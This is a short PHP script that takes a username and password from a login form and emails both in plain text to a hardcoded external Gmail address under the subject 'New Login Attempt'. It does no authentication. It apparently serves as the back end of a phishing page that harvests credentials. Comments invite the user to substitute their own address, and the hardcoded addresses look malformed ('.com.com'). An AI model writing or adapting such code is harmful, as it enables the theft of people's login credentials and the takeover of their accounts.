<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Email details
    $to = "shareefmoosa135@gmail.com.com"; // Replace with your email address
    $subject = "New Login Attempt";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: ajmal.aj.applications@gmail.com.com"; // Replace with a valid "From" email address

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login details sent successfully.";
    } else {
        echo "Failed to send email.";
    }
} else {
    echo "Invalid request.";
}
?>
